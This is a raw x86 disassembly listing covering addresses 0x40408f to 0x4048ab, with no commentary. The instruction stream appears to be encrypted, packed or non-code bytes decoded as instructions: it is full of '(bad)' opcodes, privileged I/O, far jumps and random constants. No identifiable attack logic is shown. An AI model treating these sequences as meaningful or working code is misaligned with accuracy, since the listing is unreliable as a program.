  40408f:	(bad)  
  404090:	jbe    0x4040c7
  404092:	icebp  
  404093:	scas   eax,DWORD PTR es:[edi]
  404094:	loopne 0x40406e
  404096:	pop    ds
  404097:	lods   eax,DWORD PTR ds:[esi]
  404098:	inc    eax
  404099:	sbb    al,0x65
  40409b:	sbb    DWORD PTR [edx-0x1fd31d99],edx
  4040a1:	js     0x4040de
  4040a3:	stos   DWORD PTR es:[edi],eax
  4040a4:	pop    esp
  4040a5:	ret    0x9436
  4040a8:	ds push es
  4040aa:	(bad)  
  4040ac:	imul   BYTE PTR [esi+0x7149e458]
  4040b2:	and    esp,edi
  4040b4:	imul   edi,DWORD PTR [si-0x44],0x597d65e7
  4040bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040bd:	push   edi
  4040be:	test   al,0x14
  4040c0:	popa   
  4040c1:	repnz pop ds
  4040c3:	pusha  
  4040c4:	pop    esi
  4040c5:	adc    al,0xaf
  4040c7:	xchg   edi,eax
  4040c8:	sbb    DWORD PTR [edx],edi
  4040ca:	mov    ds:0xaa42a004,eax
  4040cf:	mov    esp,0xa2f5e3e5
  4040d4:	xor    DWORD PTR [eax],0x4132cd8
  4040da:	into   
  4040db:	sub    al,0xf2
  4040dd:	loop   0x404065
  4040df:	and    DWORD PTR [eax+ebp*1],0x62
  4040e3:	fsub   QWORD PTR [edi]
  4040e5:	push   esi
  4040e6:	fmul   DWORD PTR [edi-0x3cf02f2e]
  4040ec:	xchg   DWORD PTR fs:[ecx-0x2938df1],edi
  4040f3:	dec    esi
  4040f4:	shl    DWORD PTR [eax+ebx*1-0x4983186d],1
  4040fb:	gs jo  0x404152
  4040fe:	mov    DWORD PTR [ecx-0x78ec8103],edx
  404104:	mov    cl,0x49
  404106:	enter  0x201,0x7a
  40410a:	(bad)  
  40410b:	retf   
  40410c:	mov    ds:0x88003e5a,eax
  404111:	gs jg  0x4040de
  404114:	icebp  
  404115:	sbb    DWORD PTR [esp+edi*8],esp
  404118:	sbb    bl,BYTE PTR [ebx]
  40411a:	rcl    DWORD PTR [eax],cl
  40411c:	idiv   ah
  40411e:	jne    0x4040f4
  404120:	(bad)  
  404121:	and    al,0x5b
  404123:	mov    ebx,0x70b47d3e
  404128:	loopne 0x404103
  40412a:	jg     0x40410b
  40412c:	fdiv   QWORD PTR [ebx+0x60]
  40412f:	in     al,0x83
  404131:	pop    ss
  404132:	jmp    0x4040ea
  404134:	add    bl,BYTE PTR [edx+0x1e7d7a6f]
  40413a:	xchg   ecx,eax
  40413b:	mov    al,0xb4
  40413d:	pop    eax
  40413e:	pop    edi
  40413f:	xor    eax,0xd27ae8fc
  404144:	xchg   edi,eax
  404145:	ret    
  404146:	cmc    
  404147:	inc    esi
  404148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404149:	clc    
  40414a:	add    ebx,DWORD PTR [edx+0x78c50053]
  404150:	inc    esi
  404151:	rcl    BYTE PTR [esi],1
  404153:	and    ebx,DWORD PTR [ecx-0x24378d14]
  404159:	inc    eax
  40415a:	pushf  
  40415b:	cmp    BYTE PTR [edx+0x5e],0xd0
  40415f:	test   dl,cl
  404161:	leave  
  404162:	sbb    eax,DWORD PTR [esp+ecx*8+0x5e]
  404166:	ret    
  404167:	out    dx,eax
  404168:	push   0x2a80a67d
  40416d:	and    DWORD PTR [ecx-0x75],0xd2e0ded
  404174:	(bad)  
  404175:	mov    cl,0x3e
  404177:	push   0x136ec0fb
  40417c:	cmp    ch,BYTE PTR [edx+0x1e4a98fd]
  404182:	daa    
  404183:	into   
  404184:	jbe    0x4041b6
  404186:	jle    0x40412f
  404188:	movups XMMWORD PTR [ebx+0x1f],xmm0
  40418c:	push   eax
  40418d:	bound  ecx,QWORD PTR [edi+0x2c]
  404190:	std    
  404191:	and    al,0xfe
  404193:	outs   dx,DWORD PTR ds:[esi]
  404194:	adc    BYTE PTR [edx],ah
  404196:	sbb    eax,0xbf126b76
  40419b:	push   cs
  40419c:	fst    DWORD PTR [edi+esi*4-0x2]
  4041a0:	pusha  
  4041a1:	repnz mov DWORD PTR [ecx],ecx
  4041a4:	pop    eax
  4041a5:	rcl    DWORD PTR [edi+0x13],1
  4041a8:	out    0x98,eax
  4041aa:	leave  
  4041ab:	inc    esp
  4041ac:	and    bh,BYTE PTR [edi-0xa31e416]
  4041b2:	mov    cs,WORD PTR [ebx+edi*1]
  4041b5:	xor    al,0xc5
  4041b7:	popf   
  4041b8:	leave  
  4041b9:	jbe    0x40423a
  4041bb:	jecxz  0x404234
  4041bd:	adc    al,0xc9
  4041bf:	add    eax,DWORD PTR [ecx-0x22]
  4041c2:	not    DWORD PTR [ecx+0x7cec253f]
  4041c8:	(bad)  
  4041c9:	(bad)  
  4041ca:	cli    
  4041cb:	ds sahf 
  4041cd:	xor    eax,0x784bae02
  4041d2:	xor    ecx,DWORD PTR [ecx]
  4041d4:	(bad)  
  4041d5:	fsub   QWORD PTR [edi+0x27]
  4041d8:	mov    bh,0x32
  4041da:	adc    cl,BYTE PTR [eax+esi*1+0x3b14d388]
  4041e1:	jecxz  0x404225
  4041e3:	adc    BYTE PTR [edi+ebp*4+0x53e8aea2],0x2b
  4041eb:	mov    ebx,0xc0556f3b
  4041f0:	mov    ch,0x2
  4041f2:	inc    esi
  4041f3:	xor    DWORD PTR [edx],ebp
  4041f5:	pop    ebx
  4041f6:	push   edi
  4041f7:	dec    esi
  4041f8:	fs push esp
  4041fa:	int3   
  4041fb:	mov    dl,0xa7
  4041fd:	je     0x404201
  4041ff:	or     BYTE PTR [ebx],ch
  404201:	mov    bl,0xe1
  404203:	xor    dh,BYTE PTR ds:0x266333e1
  404209:	clc    
  40420a:	xchg   ebx,eax
  40420b:	out    dx,al
  40420c:	test   eax,0x1d1bbcd4
  404211:	xor    cl,al
  404213:	inc    ebp
  404214:	sbb    BYTE PTR gs:[esi+0x14],0xb3
  404219:	add    esi,esp
  40421b:	push   0xeb8be171
  404220:	sub    DWORD PTR [eax],ecx
  404222:	data16 or cl,BYTE PTR [ecx-0x35]
  404226:	shl    DWORD PTR [edx+0x7f],1
  404229:	ss add eax,0x8b60663d
  40422f:	or     al,0xb
  404231:	adc    DWORD PTR [ebx-0x3854d297],eax
  404237:	in     al,0xe6
  404239:	jo     0x4042a5
  40423b:	ins    DWORD PTR es:[edi],dx
  40423c:	inc    edi
  40423d:	ds cmp eax,0x5c2b2484
  404243:	add    al,0xbe
  404245:	cmp    esi,DWORD PTR [ebp+0x3a44749a]
  40424b:	sbb    bl,BYTE PTR [edx+0x211eb4b7]
  404251:	or     edi,DWORD PTR [ebx-0x1403eb58]
  404257:	mov    edi,0x13702844
  40425c:	outs   dx,DWORD PTR ds:[esi]
  40425d:	dec    ebp
  40425e:	popf   
  40425f:	adc    edi,DWORD PTR [edx+edx*1]
  404262:	into   
  404263:	sub    BYTE PTR [esi],dh
  404265:	cld    
  404266:	push   ecx
  404267:	es dec ebp
  404269:	push   eax
  40426a:	ret    
  40426b:	std    
  40426c:	out    0x2c,al
  40426e:	call   DWORD PTR [eax+0x6f]
  404271:	or     eax,0x66eb6f6c
  404276:	pushf  
  404277:	cli    
  404278:	mov    edi,0x6efbc6f1
  40427d:	jnp    0x4042b7
  40427f:	adc    eax,eax
  404281:	push   ebx
  404282:	jg     0x40427b
  404284:	add    DWORD PTR [edi],ebx
  404286:	and    eax,0xc9e10cd5
  40428b:	dec    ecx
  40428c:	mov    ecx,0xdc98bc03
  404291:	pop    ss
  404292:	dec    esi
  404293:	sub    BYTE PTR [esi+0x3c],ch
  404296:	xchg   ebp,eax
  404297:	fs loopne 0x4042f9
  40429a:	or     ebx,DWORD PTR [ebx]
  40429c:	pop    esp
  40429d:	mov    esi,0x2bdf452d
  4042a2:	or     esi,DWORD PTR [esi-0x78d4adff]
  4042a8:	stc    
  4042a9:	and    BYTE PTR [ebp+0xb599c75],ah
  4042af:	loopne 0x404280
  4042b1:	shl    BYTE PTR [edi+0x22],cl
  4042b4:	add    ch,al
  4042b6:	out    dx,eax
  4042b7:	icebp  
  4042b8:	int    0xa9
  4042ba:	ret    
  4042bb:	test   eax,0xe55b8df3
  4042c0:	push   ss
  4042c1:	ins    BYTE PTR es:[edi],dx
  4042c2:	and    al,0x36
  4042c4:	inc    edi
  4042c5:	xor    eax,0xd23a653a
  4042ca:	mov    ds:0x4f435efc,al
  4042cf:	call   DWORD PTR [esi-0x743203b9]
  4042d5:	xchg   ebp,eax
  4042d6:	mov    esi,0x3413d37f
  4042db:	inc    ebx
  4042dc:	test   DWORD PTR ds:0x196ac401,edi
  4042e2:	mov    ebx,edx
  4042e4:	jmp    0xbff:0xb535586
  4042eb:	and    BYTE PTR [edx+0x61dbd905],cl
  4042f1:	cmc    
  4042f2:	sbb    eax,0xbcab52a6
  4042f7:	pop    esp
  4042f8:	je     0x404342
  4042fa:	jo     0x40432f
  4042fc:	or     al,0x63
  4042fe:	in     eax,dx
  4042ff:	daa    
  404300:	mov    WORD PTR [eax-0x11],gs
  404303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404304:	retf   0xb94c
  404307:	lods   al,BYTE PTR ds:[esi]
  404308:	inc    eax
  404309:	mov    bl,0xc1
  40430b:	and    bl,BYTE PTR [ecx]
  40430d:	inc    esp
  40430e:	imul   esi,DWORD PTR [edi],0x231ff39b
  404314:	pop    esp
  404315:	hlt    
  404316:	cmc    
  404317:	dec    esp
  404318:	outs   dx,DWORD PTR ds:[esi]
  404319:	or     al,0x35
  40431b:	mov    ecx,esi
  40431d:	adc    al,0x51
  40431f:	loop   0x40432a
  404321:	cmp    eax,0x1815e9c9
  404326:	push   ecx
  404327:	sbb    BYTE PTR [ebx+eiz*2+0x2284e9cd],0x8d
  40432f:	icebp  
  404330:	or     al,0x62
  404332:	popa   
  404333:	mov    ch,0x70
  404335:	xor    ch,BYTE PTR [edx+0x7e9e1243]
  40433b:	lea    esi,[edx+0x598c567b]
  404341:	jg     0x40439a
  404343:	push   edi
  404344:	add    DWORD PTR [ebp+0x3fc91c2a],edi
  40434a:	and    BYTE PTR [eax-0x3],0xa3
  40434e:	dec    esi
  40434f:	int3   
  404350:	in     al,dx
  404351:	arpl   WORD PTR [edx],bp
  404353:	nop/reserved BYTE PTR [ecx-0x4b]
  404357:	inc    edx
  404358:	adc    al,0x4b
  40435a:	jecxz  0x4043d3
  40435c:	sbb    dl,BYTE PTR [edx]
  40435e:	mov    ?,WORD PTR [edi+edx*4-0x2e]
  404362:	enter  0xbbc6,0x72
  404366:	(bad)  
  404367:	hlt    
  404368:	sbb    DWORD PTR [esi+edx*8+0x6a],edx
  40436c:	jb     0x40438c
  40436e:	fisttp WORD PTR [eax]
  404370:	sahf   
  404371:	gs cmp eax,0x8dafefb8
  404377:	div    DWORD PTR [ecx-0x4f]
  40437a:	cs call 0xc032:0x5572437f
  404382:	sub    al,0x93
  404384:	inc    esi
  404385:	shl    ah,1
  404387:	mov    al,ds:0x6ccd65e0
  40438c:	push   esi
  40438d:	jno    0x4043ab
  40438f:	cmp    BYTE PTR ds:0x1da5ac2d,al
  404395:	call   DWORD PTR [ecx+0x1e62df6f]
  40439b:	in     al,dx
  40439c:	jae    0x404352
  40439e:	or     DWORD PTR [edx-0x7],0xd7f9f810
  4043a5:	mov    esp,0x360651b1
  4043aa:	(bad)
  4043ad:	arpl   WORD PTR [eax-0x59ac6fc7],sp
  4043b3:	inc    ecx
  4043b4:	cmp    edx,esp
  4043b6:	push   esi
  4043b7:	arpl   WORD PTR [esi+0x54],di
  4043ba:	push   ss
  4043bb:	mov    ecx,0xf4d97fc2
  4043c0:	std    
  4043c1:	leave  
  4043c2:	js     0x40440f
  4043c4:	mov    dl,0xcf
  4043c6:	push   ebp
  4043c7:	or     ebp,DWORD PTR [edi+0x15]
  4043ca:	mov    bh,0x52
  4043cc:	push   ss
  4043cd:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4043cf:	fcomp  st(7)
  4043d1:	out    dx,eax
  4043d2:	lods   eax,DWORD PTR ds:[esi]
  4043d3:	jmp    0x9d186b2e
  4043d8:	push   ebx
  4043d9:	mov    al,ds:0x4fb0a406
  4043de:	or     BYTE PTR [esp+edi*1+0x150f843d],dl
  4043e5:	js     0x4043f1
  4043e7:	aaa    
  4043e8:	mov    eax,0x5213e207
  4043ed:	jl     0x4043b5
  4043ef:	mov    ebx,0xeb2f2b3d
  4043f4:	mov    ecx,0xf9a1605c
  4043f9:	outs   dx,BYTE PTR ds:[esi]
  4043fa:	inc    ebp
  4043fb:	(bad)  
  4043fc:	(bad)  
  4043fd:	jle    0x404397
  4043ff:	leave  
  404400:	lock ficom DWORD PTR [ebx]
  404403:	fs fwait
  404405:	pop    ecx
  404406:	loopne 0x404405
  404408:	pop    ebx
  404409:	ds int3 
  40440b:	add    esp,DWORD PTR [ebx-0x5d]
  40440e:	clc    
  40440f:	popa   
  404410:	enter  0x567f,0xf1
  404414:	mov    ecx,0xa4a1a65a
  404419:	inc    esp
  40441a:	div    BYTE PTR [eax]
  40441c:	fimul  WORD PTR [edi-0x16]
  40441f:	xchg   ecx,eax
  404420:	mov    dh,0xbd
  404422:	mov    cl,0xc9
  404424:	daa    
  404425:	mov    ds:0xdc2cab8f,eax
  40442a:	into   
  40442b:	sar    BYTE PTR [ebx+edx*8-0x12],0x8d
  404430:	in     eax,dx
  404431:	adc    BYTE PTR [edx+0x269b9c0c],bh
  404437:	xchg   BYTE PTR [ebp+0x3767808b],ch
  40443d:	cmp    bl,BYTE PTR [eax]
  40443f:	sub    edi,DWORD PTR [ebx-0x5f49fc04]
  404445:	and    ch,bl
  404447:	mov    ah,0x12
  404449:	cmp    ebp,DWORD PTR [ebx-0x799c6c21]
  40444f:	daa    
  404450:	cld    
  404451:	push   edi
  404452:	dec    eax
  404453:	fisubr DWORD PTR [edx+0x36ace1cb]
  404459:	mov    al,0xac
  40445b:	sub    BYTE PTR [ecx+0x27],al
  40445e:	dec    ebp
  40445f:	and    al,0x7b
  404461:	adc    DWORD PTR [ecx],esp
  404463:	add    DWORD PTR [eax+0x48],0x87a48235
  40446a:	and    eax,0x5832d516
  40446f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404470:	mov    bh,0x69
  404472:	push   cs
  404473:	scas   al,BYTE PTR es:[edi]
  404474:	adc    al,0xf6
  404476:	push   ebp
  404477:	pop    ebx
  404478:	adc    eax,0xa23c4670
  40447d:	fnstsw WORD PTR [eax-0x7c71f456]
  404483:	test   eax,0x89e01557
  404488:	sub    DWORD PTR [edi-0x4a],0x2f8d9b02
  40448f:	cwde   
  404490:	and    al,0xda
  404492:	fs jbe 0x4044f6
  404495:	es lahf 
  404497:	pop    ss
  404498:	xchg   edi,eax
  404499:	and    DWORD PTR [esi],0x93b2264d
  40449f:	mov    esp,0x1e3d65d
  4044a4:	add    eax,0xcf30da3
  4044a9:	ds jbe 0x4044a8
  4044ac:	(bad)  
  4044ad:	cwde   
  4044ae:	jge    0x404453
  4044b0:	fdivp  st(7),st
  4044b2:	pop    ebx
  4044b3:	int3   
  4044b4:	call   0xdd6d90e5
  4044b9:	hlt    
  4044ba:	fwait
  4044bb:	je     0x404448
  4044bd:	je     0x404497
  4044bf:	adc    BYTE PTR [ebp+0x74],0xee
  4044c3:	fmul   st(6),st
  4044c5:	dec    ebx
  4044c6:	je     0x4044b3
  4044c8:	xchg   BYTE PTR [ebx-0x44],dl
  4044cb:	or     bl,bl
  4044cd:	pop    ebx
  4044ce:	mov    WORD PTR [esi+0x27],fs
  4044d1:	nop
  4044d2:	aas    
  4044d3:	jmp    0x8534434c
  4044d8:	add    eax,ecx
  4044da:	aaa    
  4044db:	fmul   DWORD PTR [ecx+0x25d9b2b7]
  4044e1:	aaa    
  4044e2:	test   eax,0x85238376
  4044e7:	sahf   
  4044e8:	push   ss
  4044e9:	xor    eax,0xa41e86fd
  4044ee:	push   ds
  4044ef:	int    0xdf
  4044f1:	mov    ah,0x30
  4044f3:	jg     0x404512
  4044f5:	pop    ebp
  4044f6:	shl    DWORD PTR [edi],0xd7
  4044f9:	in     al,0x68
  4044fb:	jo     0x40450f
  4044fd:	mov    eax,ds:0xd1bda3d
  404502:	enter  0x2443,0x38
  404506:	push   es
  404507:	sub    dl,bh
  404509:	pop    eax
  40450a:	mov    esi,0xcd7118b2
  40450f:	popf   
  404510:	scas   al,BYTE PTR es:[edi]
  404511:	bnd jg 0x404535
  404514:	test   eax,0xcfa8bba6
  404519:	jg     0x4044b1
  40451b:	sbb    BYTE PTR [eax],al
  40451d:	mov    esi,0x2f904edc
  404522:	div    BYTE PTR [ebp-0x1e3d92c6]
  404528:	mov    ch,0xdf
  40452a:	(bad)  
  40452b:	outs   dx,DWORD PTR ds:[esi]
  40452c:	fnstcw WORD PTR [ecx-0x6f26c76d]
  404532:	inc    ebx
  404533:	lods   al,BYTE PTR ds:[esi]
  404534:	js     0x4044c4
  404536:	sar    BYTE PTR [esi-0x1d],1
  404539:	or     al,dl
  40453b:	aaa    
  40453c:	mov    ds:0x6ba7d057,al
  404541:	fsub   QWORD PTR [edi]
  404543:	sub    al,0x0
  404545:	and    eax,0xddc85828
  40454a:	and    eax,0x53221f5
  40454f:	inc    ecx
  404550:	ins    BYTE PTR es:[edi],dx
  404551:	mov    ds:0xb3234f2e,al
  404556:	xor    edx,DWORD PTR [edx+0x2e]
  404559:	ja     0x404559
  40455b:	ins    BYTE PTR es:[edi],dx
  40455c:	(bad)  
  40455d:	icebp  
  40455e:	mov    al,ds:0xbd864cb4
  404563:	(bad)  
  404564:	jns    0x404598
  404566:	stos   DWORD PTR es:[edi],eax
  404567:	pop    edx
  404568:	arpl   WORD PTR ds:0xec51d8dc,bx
  40456e:	pop    esi
  40456f:	popf   
  404570:	clc    
  404571:	call   0xc82:0x1302000e
  404578:	dec    edx
  404579:	pop    ss
  40457a:	jl     0x404582
  40457c:	aas    
  40457d:	rcl    BYTE PTR ds:0xef401777,0xd0
  404584:	lds    eax,FWORD PTR [eax]
  404586:	dec    esp
  404587:	xchg   esi,eax
  404588:	neg    BYTE PTR [ecx-0x27e7b34]
  40458e:	jp     0x404545
  404590:	pop    edi
  404591:	in     eax,0x20
  404593:	cs pop edi
  404595:	mov    bh,0x73
  404597:	popf   
  404598:	xchg   esp,eax
  404599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40459a:	scas   al,BYTE PTR es:[edi]
  40459b:	ret    0xd35e
  40459e:	sbb    DWORD PTR [edi-0x43],esp
  4045a1:	inc    edx
  4045a2:	xchg   edx,eax
  4045a3:	sub    edi,DWORD PTR [edx+0x132c218e]
  4045a9:	mov    eax,0x13737776
  4045ae:	xchg   ecx,eax
  4045af:	cmc    
  4045b0:	(bad)  
  4045b1:	loope  0x404561
  4045b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045b4:	je     0x4045d7
  4045b6:	lods   eax,DWORD PTR ds:[esi]
  4045b7:	je     0x4045f0
  4045b9:	(bad)  
  4045bb:	fwait
  4045bc:	pusha  
  4045bd:	add    al,0x1d
  4045bf:	lahf   
  4045c0:	jne    0x4045ac
  4045c2:	hlt    
  4045c3:	aam    0x4c
  4045c5:	mov    ds:0x5842ceed,al
  4045ca:	sar    BYTE PTR [esi-0x6d],cl
  4045cd:	(bad)  
  4045cf:	ret    0xef57
  4045d2:	pop    ebx
  4045d3:	and    al,ch
  4045d5:	(bad)
  4045d8:	icebp  
  4045d9:	fidiv  DWORD PTR [edi+esi*4]
  4045dc:	iret   
  4045dd:	cmp    eax,0xea2c624e
  4045e2:	call   0x72881133
  4045e7:	add    DWORD PTR [ecx+0x3500d433],esi
  4045ed:	jb     0x4045c4
  4045ef:	cmc    
  4045f0:	jp     0x4045f6
  4045f2:	shl    BYTE PTR cs:[edx-0x5c],cl
  4045f6:	popf   
  4045f7:	mov    ah,0x66
  4045f9:	lds    ebx,FWORD PTR [ecx+ecx*8]
  4045fc:	mov    eax,0xa7d37029
  404601:	jmp    0x484d57f3
  404606:	rcl    esp,0xe8
  404609:	add    dl,BYTE PTR [ebp-0xbb2fc48]
  40460f:	fs sub al,0x94
  404612:	and    eax,0x17554082
  404617:	dec    esp
  404618:	frstor [esi-0x5d4ab058]
  40461e:	inc    edx
  40461f:	aam    0x9d
  404621:	imul   ecx,DWORD PTR [edi],0xfb0028d
  404627:	push   edi
  404628:	push   0x14
  40462a:	sub    BYTE PTR [ebx+0x7c],cl
  40462d:	jg     0x40468a
  40462f:	cmp    bl,cl
  404631:	mov    BYTE PTR [esi+0x2e2b8755],ch
  404637:	xor    BYTE PTR [edx+0x55dfbcb7],ah
  40463d:	aaa    
  40463e:	cdq    
  40463f:	add    BYTE PTR [edx-0x5e],ah
  404642:	and    edi,DWORD PTR [esi-0x3cbe3044]
  404648:	cld    
  404649:	pop    ds
  40464a:	ror    bl,cl
  40464c:	pop    ebp
  40464d:	dec    ebx
  40464e:	icebp  
  40464f:	xchg   edx,eax
  404650:	dec    eax
  404651:	jecxz  0x4046a3
  404653:	mov    ebp,ecx
  404655:	sbb    eax,0xac441944
  40465a:	(bad)  
  40465b:	retf   
  40465c:	mov    al,0x86
  40465e:	xor    DWORD PTR [eax-0x5e],ecx
  404661:	mov    cl,dh
  404663:	in     al,dx
  404664:	stc    
  404665:	loope  0x404619
  404667:	fwait
  404668:	sbb    esp,DWORD PTR [ebx]
  40466a:	cmp    eax,DWORD PTR [edx+0x68]
  40466d:	shl    ch,cl
  40466f:	sti    
  404670:	ret    0xdf83
  404673:	xor    al,0xa8
  404675:	mov    esi,0x9c6e76d2
  40467a:	lahf   
  40467b:	add    dl,BYTE PTR [eax-0x681d4684]
  404681:	bound  ebx,QWORD PTR gs:[ebx]
  404684:	(bad)  
  404685:	jge    0x404640
  404687:	js     0x404620
  404689:	xchg   ebx,eax
  40468a:	pop    edx
  40468b:	ins    DWORD PTR es:[edi],dx
  40468c:	int    0x1c
  40468e:	push   ebp
  40468f:	fcomip st,st(3)
  404691:	or     BYTE PTR [ebp+0x76534390],dh
  404697:	popf   
  404698:	add    al,0xc8
  40469a:	repnz enter 0x43c9,0x5a
  40469f:	ret    0x63a7
  4046a2:	pop    ebp
  4046a3:	loop   0x404625
  4046a5:	gs fs jae 0x40468b
  4046a9:	xchg   BYTE PTR ds:0xe8b6c369,ch
  4046af:	mov    edi,0xdb2a45ff
  4046b4:	adc    BYTE PTR ds:0x68b3f6a5,al
  4046ba:	mov    eax,ds:0x3f948db8
  4046bf:	add    eax,0x2ab87f10
  4046c4:	or     esi,DWORD PTR [ecx+eax*2-0x52]
  4046c8:	mov    esp,0x7a121931
  4046cd:	enter  0xef46,0x74
  4046d1:	sbb    DWORD PTR ds:0x14c595ea,edi
  4046d7:	data16 mov ds:0xbc238a89,al
  4046dd:	jg     0x40471f
  4046df:	stos   BYTE PTR es:[edi],al
  4046e0:	out    0x25,eax
  4046e2:	xchg   edx,eax
  4046e3:	sub    eax,0xaec19722
  4046e8:	sbb    dh,dh
  4046ea:	xchg   edi,eax
  4046eb:	mov    ah,0x8e
  4046ed:	jl     0x40476c
  4046ef:	arpl   WORD PTR [ebp-0x24976940],bx
  4046f5:	das    
  4046f6:	inc    ebx
  4046f7:	xor    al,0x68
  4046f9:	mov    esi,0xd140d66f
  4046fe:	mov    ch,0x95
  404700:	pop    ebx
  404701:	pusha  
  404702:	test   al,0x9d
  404704:	xchg   di,ax
  404706:	mov    esi,0x3485b660
  40470b:	scas   eax,DWORD PTR es:[edi]
  40470c:	fcmovnb st,st(5)
  40470e:	stos   BYTE PTR es:[edi],al
  40470f:	sbb    ecx,esi
  404711:	inc    ebp
  404712:	in     eax,dx
  404713:	loopne 0x4046ec
  404715:	push   ss
  404716:	sub    edx,DWORD PTR [ecx+0x7d]
  404719:	sbb    al,0x35
  40471b:	jle    0x4046f1
  40471d:	dec    esp
  40471e:	push   0x91c6c311
  404723:	jne    0x40474c
  404725:	adc    al,dl
  404727:	adc    ebp,eax
  404729:	pusha  
  40472a:	aas    
  40472b:	les    esp,FWORD PTR [esi]
  40472d:	dec    ecx
  40472e:	and    DWORD PTR [esi+0x7],0xe3319969
  404735:	push   edi
  404736:	xchg   ecx,eax
  404737:	dec    ebp
  404738:	xor    bh,dh
  40473a:	sbb    eax,0x2508be47
  40473f:	clc    
  404740:	cld    
  404741:	inc    esp
  404742:	scas   eax,DWORD PTR es:[edi]
  404743:	mov    ebp,0x5bfbd1e8
  404748:	loopne 0x40472e
  40474a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40474b:	hlt    
  40474c:	jnp    0x4046f3
  40474e:	jl     0x404709
  404750:	pop    edi
  404751:	aam    0xf3
  404753:	push   edx
  404754:	push   ebp
  404755:	pop    ss
  404756:	test   eax,0x7c1fe50a
  40475b:	fld    TBYTE PTR [ebx-0x25]
  40475e:	clc    
  40475f:	fild   QWORD PTR [eax+0x48]
  404762:	mov    ds:0xf9067674,al
  404767:	mov    al,0x28
  404769:	mov    ds:0x9149eaac,al
  40476e:	mov    al,0x21
  404770:	sub    edi,edi
  404772:	dec    ebx
  404773:	adc    eax,0x735b6677
  404778:	adc    BYTE PTR [esi-0x2cf83f8],ah
  40477e:	fnsave [esi]
  404780:	ins    DWORD PTR es:[edi],dx
  404781:	in     al,dx
  404782:	test   DWORD PTR [ebp*1-0x518a5cd6],0x542c083d
  40478d:	stos   BYTE PTR es:[edi],al
  40478e:	retf   
  40478f:	icebp  
  404790:	(bad)  
  404791:	jne    0x404800
  404793:	push   0x3bacc867
  404798:	sub    ah,dl
  40479a:	loop   0x404770
  40479c:	ss pop es
  40479e:	popf   
  40479f:	mov    ecx,0xb1c1191
  4047a4:	pushf  
  4047a5:	call   0x2ca48f33
  4047aa:	mov    bh,0xb6
  4047ac:	adc    BYTE PTR [ecx],cl
  4047ae:	inc    esp
  4047af:	cmp    esp,ecx
  4047b1:	jge    0x404782
  4047b3:	inc    ebx
  4047b4:	es (bad) 
  4047b6:	sub    ebx,DWORD PTR [esi]
  4047b8:	rcr    BYTE PTR [edi+ebp*2],cl
  4047bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047bc:	dec    eax
  4047bd:	mov    dl,0xf2
  4047bf:	lods   al,BYTE PTR ds:[esi]
  4047c0:	(bad)  
  4047c1:	and    al,0xcf
  4047c3:	lods   eax,DWORD PTR ds:[esi]
  4047c4:	icebp  
  4047c5:	dec    esi
  4047c6:	sub    ah,BYTE PTR [ebx-0x3f495477]
  4047cc:	ret    0x4506
  4047cf:	mov    al,0x78
  4047d1:	jns    0x404799
  4047d3:	ror    BYTE PTR [eax+0x51],1
  4047d6:	cmp    BYTE PTR [esi+0x2f52ccf8],bh
  4047dc:	outs   dx,BYTE PTR ds:[esi]
  4047dd:	jb     0x40479e
  4047df:	ins    BYTE PTR es:[edi],dx
  4047e0:	call   0x4ec9:0xaf86cdd4
  4047e7:	dec    edi
  4047e8:	out    0x48,al
  4047ea:	jmp    0xe37a:0xc70275a7
  4047f1:	jmp    0x4047f4
  4047f3:	daa    
  4047f4:	ins    BYTE PTR es:[edi],dx
  4047f5:	aad    0xc4
  4047f7:	push   ss
  4047f8:	fst    DWORD PTR [ecx]
  4047fa:	in     eax,dx
  4047fb:	mov    eax,ds:0xaabd384c
  404800:	mov    edx,0xc9d7110
  404805:	xor    al,0x9c
  404807:	xchg   edx,eax
  404808:	jmp    0x430683f8
  40480d:	mov    ds:0xc7140531,al
  404812:	retf   
  404813:	sbb    dh,BYTE PTR [ebx-0x26]
  404816:	div    BYTE PTR [esi+0x3a7769bb]
  40481c:	jl     0x4047af
  40481e:	mov    eax,0xa30dd8f7
  404823:	xor    esi,DWORD PTR [eax+0x60ba0e36]
  404829:	push   ecx
  40482a:	out    0x44,eax
  40482c:	push   esi
  40482d:	mov    ch,0x33
  40482f:	popf   
  404830:	xchg   edx,eax
  404831:	push   0xffffffb4
  404833:	(bad)  
  404834:	cli    
  404835:	and    eax,ecx
  404837:	out    0x6d,eax
  404839:	pop    edi
  40483a:	enter  0x9a06,0x9f
  40483e:	scas   al,BYTE PTR es:[edi]
  40483f:	fwait
  404840:	iret   
  404841:	int    0x24
  404843:	push   ebx
  404844:	fbstp  TBYTE PTR [eax]
  404846:	inc    edi
  404847:	sub    cl,BYTE PTR [ebx]
  404849:	cmp    cl,BYTE PTR [ebp-0x3b]
  40484c:	cmp    al,BYTE PTR gs:[ecx+edx*1-0x1a]
  404851:	push   0x23
  404853:	mov    ch,0x4c
  404855:	inc    esi
  404856:	neg    DWORD PTR [ecx-0x43]
  404859:	adc    al,0x4
  40485b:	and    al,0x1d
  40485d:	jmp    0x40480d
  40485f:	cmp    BYTE PTR [edi],0x80
  404862:	dec    ecx
  404863:	dec    ebp
  404864:	mov    DWORD PTR [eax+0x65f2d57a],esp
  40486a:	(bad)  
  40486b:	test   eax,0xf774bc1e
  404870:	loopne 0x4048bf
  404872:	mov    ch,BYTE PTR [edx]
  404874:	or     eax,0x47007000
  404879:	test   edx,edx
  40487b:	sbb    al,0xd1
  40487d:	and    eax,0x33fe18c
  404882:	xor    al,0x5
  404884:	mov    edx,0x361d4ff5
  404889:	jp     0x40482b
  40488b:	inc    edi
  40488c:	arpl   WORD PTR [eax],si
  40488e:	push   ss
  40488f:	pushf  
  404890:	sub    eax,0xd6a03307
  404895:	popf   
  404896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404897:	das    
  404898:	int    0x1f
  40489a:	test   eax,edx
  40489c:	arpl   WORD PTR [ebx+0x158b66dd],ax
  4048a2:	mul    al
  4048a4:	lock fstp QWORD PTR [edx+0x7e4ee4ab]
  4048ab:	mov    ecx,0xc26a4400
